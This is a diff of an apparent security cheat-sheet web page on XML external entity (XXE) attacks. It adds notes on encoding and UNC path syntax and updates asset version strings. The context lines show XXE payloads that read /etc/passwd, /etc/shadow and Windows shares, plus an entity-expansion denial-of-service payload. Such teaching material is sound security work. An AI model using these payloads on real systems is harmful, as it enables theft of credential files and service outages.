@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=3ff2768">
+  <link rel="stylesheet" href="/assets/style.css?v=fb938cd">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -986,6 +986,8 @@ graph LR
 &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
 &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></pre>
 <p>In this payload, the entity "xxe" will return the content of the file <code>/etc/passwd</code> since it is referenced below the definition in the element foo. Depending on the context this may not result in data exfiltration since it depends on how the application returns data.</p>
+<h4 id="note-on-encoding">Note on encoding</h4>
+<p>The payload above uses <code>ISO-8859-1</code> instead of <code>UTF-8</code>. This is intentional — some system files contain characters outside the ASCII range but within the Latin-1 charset. Declaring <code>ISO-8859-1</code> prevents the parser from failing when it encounters those characters during entity substitution. For files that are pure ASCII, <code>UTF-8</code> works equally well.</p>
 <h3 id="common-unixlinux-files">Common Unix/Linux files</h3>
 <pre class="highlight"><code class="language-xml">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;          &lt;!-- User accounts --&gt;
 &lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;          &lt;!-- Password hashes (requires root — rarely readable) --&gt;
@@ -1015,6 +1017,8 @@ graph LR
 &lt;!ENTITY xxe SYSTEM "file:///\\192.168.1.100\c$\Windows\System32\drivers\etc\hosts"&gt;
 &lt;!ENTITY xxe SYSTEM "file:///\\dc.example.com\SYSVOL\example.com\Policies\"&gt;</code></pre>
 <p>Some notes on Windows paths: use forward slashes even on Windows (<code>file:///C:/path/to/file</code>) since backslashes are interpreted as escape characters in XML. UNC paths use <code>file:///\\server\share\file</code>. Some parsers also support alternate data streams: <code>file:///C:/path/file.txt:zone.identifier</code>.</p>
+<h4 id="note-on-unc-path-syntax">Note on UNC path syntax</h4>
+<p>The forward slash rule applies to local Windows file paths (<code>file:///C:/path/to/file</code>). UNC paths are an exception — they require the double backslash notation (<code>\\server\share\file</code>) because that is how the UNC convention is defined. Some parsers also accept forward slash equivalents (<code>file:////server/share/file</code>), but backslash notation is more broadly supported for UNC across Java-based parsers.</p>
 <h2 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h2>
 <p>Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to unintended locations. This can lead to unauthorized actions or access to data within the organization and provides the attacker with the ability of fingerprinting other services running internally.</p>
 <p>The basic SSRF payload makes the parser request an internal URL:</p>
@@ -1145,7 +1149,7 @@ graph LR
   &lt;!ENTITY a "xxxxxxxxxxxxxxxx"&gt;
 ]&gt;
 &lt;foo&gt;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&lt;/foo&gt;</code></pre>
-<p>Both attacks cause memory exhaustion, CPU exhaustion, disk exhaustion and denial of service.</p>
+<p>Both attacks cause memory exhaustion, CPU exhaustion, disk exhaustion (in some cases) and denial of service.</p>
 <hr />
 <h1 id="intermediate-techniques">Intermediate Techniques</h1>
 <p>These techniques require specific context to work: a particular entry point (SOAP, file upload), a specific parser behavior (XInclude support) or a misconfiguration in content negotiation. They are not rare but they depend on the target environment.</p>
@@ -1829,6 +1833,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=3ff2768" defer></script>
+  <script src="/assets/main.js?v=fb938cd" defer></script>
 </body>
 </html>
